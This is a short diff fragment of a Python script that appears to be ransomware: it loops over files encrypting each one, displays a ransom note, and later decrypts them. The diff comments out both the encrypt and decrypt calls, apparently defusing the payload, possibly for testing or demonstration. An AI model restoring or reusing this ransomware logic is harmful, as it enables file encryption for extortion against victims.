@@ -149,7 +149,7 @@ if __name__ == '__main__':
                 continue
             for fn in files:
                 full_path = root + os.sep + fn
-                encrypt_or_decrypt(full_path, key)
+                # encrypt_or_decrypt(full_path, key)
 
     # Show Ransom note
     sg.theme('DarkRed2')
@@ -189,7 +189,7 @@ if __name__ == '__main__':
                     for fn in files:
                         full_path = root + os.sep + fn
                         try:
-                            encrypt_or_decrypt(full_path, key, opt='decrypt')
+                            # encrypt_or_decrypt(full_path, key, opt='decrypt')
                             count += 1
                         except Exception as e:
                             print(e)
